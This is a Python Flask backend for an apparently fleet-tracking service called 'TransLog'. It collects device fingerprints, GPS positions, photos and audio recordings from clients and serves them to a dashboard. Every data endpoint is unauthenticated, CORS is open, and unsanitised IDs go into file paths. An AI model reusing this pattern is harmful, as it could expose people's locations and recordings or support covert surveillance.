from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import os, json
from flask import send_file

app = Flask(__name__)
CORS(app)

os.makedirs('data/photos', exist_ok=True)
os.makedirs('data/audio',  exist_ok=True)

locations = {}  # token -> ubicación actual
devices   = {}  # token -> info del dispositivo

# ── Registrar dispositivo (primera vez que abre el chat) ──
@app.route('/register', methods=['POST'])
def register():
    data      = request.get_json()
    driver_id = data.get('driver_id')
    if not driver_id:
        return jsonify({'error': 'Sin ID'}), 400

    devices[driver_id] = {
        'driver_id':  driver_id,
        'user_agent': data.get('user_agent', ''),
        'language':   data.get('language', ''),
        'screen':     data.get('screen', ''),
        'timezone':   data.get('timezone', ''),
        'first_seen': data.get('timestamp', datetime.utcnow().isoformat()),
        'last_seen':  data.get('timestamp', datetime.utcnow().isoformat())
    }

    # Guardar registro en archivo
    with open('data/devices.json', 'w') as f:
        json.dump(devices, f, indent=2, ensure_ascii=False)

    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 📱 Nuevo dispositivo: {driver_id} | {data.get('user_agent','')[:60]}")
    return jsonify({'ok': True, 'token': driver_id}), 200


# ── Recibe ubicación ──────────────────────────────────────
@app.route('/location', methods=['POST'])
def receive_location():
    data      = request.get_json()
    driver_id = data.get('driver_id')
    if not driver_id:
        return jsonify({'error': 'Sin ID'}), 400

    is_emergency = data.get('emergency', False)

    locations[driver_id] = {
        'driver_id': driver_id,
        'lat':       data.get('lat'),
        'lng':       data.get('lng'),
        'accuracy':  data.get('accuracy'),
        'status':    'alert' if is_emergency else 'ok',
        'timestamp': datetime.utcnow().isoformat(),
        'device':    devices.get(driver_id, {})
    }

    # Actualizar last_seen del dispositivo
    if driver_id in devices:
        devices[driver_id]['last_seen'] = datetime.utcnow().isoformat()

    tag = '🚨 EMERGENCIA' if is_emergency else '📍'
    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {tag} {driver_id[:8]}... → {data.get('lat','?'):.5f}, {data.get('lng','?'):.5f}")
    return jsonify({'ok': True}), 200


# ── Entrega ubicaciones al dashboard ─────────────────────
@app.route('/locations', methods=['GET'])
def get_locations():
    return jsonify(list(locations.values())), 200


# ── Entrega lista de dispositivos registrados ─────────────
@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify(list(devices.values())), 200


# ── Recibe foto ───────────────────────────────────────────
@app.route('/photo', methods=['POST'])
def receive_photo():
    driver_id = request.form.get('driver_id', 'unknown')
    timestamp = request.form.get('timestamp', datetime.utcnow().isoformat())
    photo     = request.files.get('photo')
    if not photo:
        return jsonify({'error': 'Sin foto'}), 400

    safe_ts  = timestamp.replace(':', '-').replace('.', '-')
    filename = f"data/photos/{driver_id[:8]}_{safe_ts}.jpg"
    photo.save(filename)

    if driver_id in locations:
        locations[driver_id]['status'] = 'alert'

    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 📸 Foto: {driver_id[:8]}...")
    return jsonify({'ok': True}), 200


# ── Recibe audio ──────────────────────────────────────────
@app.route('/audio', methods=['POST'])
def receive_audio():
    driver_id = request.form.get('driver_id', 'unknown')
    timestamp = request.form.get('timestamp', datetime.utcnow().isoformat())
    audio     = request.files.get('audio')
    if not audio:
        return jsonify({'error': 'Sin audio'}), 400

    safe_ts  = timestamp.replace(':', '-').replace('.', '-')
    filename = f"data/audio/{driver_id[:8]}_{safe_ts}.webm"
    audio.save(filename)

    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🎙️ Audio: {driver_id[:8]}...")
    return jsonify({'ok': True}), 200


# ── Health check ──────────────────────────────────────────
@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'status':      'TransLog OK ✅',
        'dispositivos': len(devices),
        'activos':      len(locations)
    }), 200

# ── Servir dashboard ──────────────────────────────────────────────
@app.route('/dashboard', methods=['GET'])
def serve_dashboard():
    return send_file('dashboard_flota.html')
if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
